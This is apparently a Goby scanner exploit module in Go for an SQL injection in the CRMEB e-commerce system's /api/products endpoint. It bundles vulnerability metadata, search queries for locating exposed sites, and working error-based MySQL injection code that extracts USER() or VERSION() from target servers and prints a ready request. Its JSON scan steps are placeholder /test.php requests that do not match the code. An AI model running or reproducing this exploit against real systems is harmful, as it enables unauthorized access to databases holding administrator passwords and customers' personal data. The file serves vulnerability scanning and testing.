package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "CRMEB e-commerce system /api/products SQL Injection Vulnerability",
    "Description": "<p>CRMEB e-commerce system is a full-stack e-commerce solution created by Xi'an Zhongbang Network Technology Co., Ltd., which aims to provide high-performance and intelligent e-commerce platform services for developers and merchants. The system integrates the functions of CRM (customer relationship management), ERP (enterprise resource planning) and EB (e-commerce). By deeply combining these functions, it helps users quickly build a stable and feature-rich online mall. It is a fully open source commercial system, with front-end and back-end separate development, all 100% open source, which can be used in applets, official accounts, H5, APP and PC terminals. It is easy to use and easy to open! Installation and use are also very simple! Use documents, interface documents, data dictionaries, two-open documents, video tutorials, and all kinds of materials are available. Even if you are a novice, you can easily get started!</p><p>CRMEB e-commerce system /api/products has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even access the server with high permissions. Write the Trojan to further obtain the permissions of the server system.</p>",
    "Product": "CRMEB-customer-relationship-management-+-e-commerce-system",
    "Homepage": "https://www.crmeb.com/",
    "DisclosureDate": "2024-06-19",
    "PostTime": "2024-06-20",
    "Author": "Town",
    "FofaQuery": "body=\"content=\\\"width=device-width\" && body=\"CRMEB\"",
    "GobyQuery": "body=\"content=\\\"width=device-width\" && body=\"CRMEB\"",
    "Level": "3",
    "Impact": "<p>CRMEB e-commerce system /api/products has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even access the server with high permissions. Write the Trojan to further obtain the permissions of the server system.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.crmeb.com/\">https://www.crmeb.com/</a></p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/3M1OK3o4fk6P35tjWOB-Eg"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "select",
            "value": "USER(),VERSION()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "CRMEB电商系统 /api/products SQL 注入漏洞",
            "Product": "CRMEB客户关系管理+电商系统",
            "Description": "<p>CRMEB电商系统是一款由西安众邦网络科技有限公司打造的全栈式电商解决方案，旨在为开发者和商家提供高性能、智能化的电商平台服务。该系统集成了CRM（客户关系管理）、ERP（企业资源规划）和EB（电子商务）的功能，通过深度结合这些功能，帮助用户快速构建稳定且功能丰富的在线商城。是一款全开源可商用的系统，前后端分离开发，全部100%开源，在小程序、公众号、H5、APP、PC端都能用，使用方便，二开方便！安装使用也很简单！使用文档、接口文档、数据字典、二开文档、视频教程，各种资料应有尽有，就算你是技术小白，也能轻松上手！<br></p><p>CRMEB电商系统&nbsp;/api/products 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.crmeb.com/\">https://www.crmeb.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>CRMEB电商系统 /api/products 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "CRMEB e-commerce system /api/products SQL Injection Vulnerability",
            "Product": "CRMEB-customer-relationship-management-+-e-commerce-system",
            "Description": "<p>CRMEB e-commerce system is a full-stack e-commerce solution created by Xi'an Zhongbang Network Technology Co., Ltd., which aims to provide high-performance and intelligent e-commerce platform services for developers and merchants. The system integrates the functions of CRM (customer relationship management), ERP (enterprise resource planning) and EB (e-commerce). By deeply combining these functions, it helps users quickly build a stable and feature-rich online mall. It is a fully open source commercial system, with front-end and back-end separate development, all 100% open source, which can be used in applets, official accounts, H5, APP and PC terminals. It is easy to use and easy to open! Installation and use are also very simple! Use documents, interface documents, data dictionaries, two-open documents, video tutorials, and all kinds of materials are available. Even if you are a novice, you can easily get started!</p><p>CRMEB e-commerce system /api/products has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even access the server with high permissions. Write the Trojan to further obtain the permissions of the server system.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.crmeb.com/\">https://www.crmeb.com/</a></p><p>2. Deploy the Web application firewall to monitor the database operation.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>CRMEB e-commerce system /api/products has SQL injection vulnerabilities. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even access the server with high permissions. Write the Trojan to further obtain the permissions of the server system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10962"
}`

	sendPayloadiwtmaxqp := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewGetRequestConfig("/api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550," + sql + "))),0x7e),3550)")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false

		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, "Malformed GTID set specification") {
			return nil, errors.New("SELECT Fail")
		}
		return resp, err

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloadiwtmaxqp
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `USER()`
			_, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/api/products`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloadiwtmaxqp
			makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
				reRequestAAAA := regexp.MustCompile(RegularUrl)
				if !reRequestAAAA.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequestAAAA.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAAAA(resp.Utf8Html, `~([^~]+)~`)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, "USER()")
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,version()))),0x7e),3550) HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo
			}
			return expResult
		},
	))
}
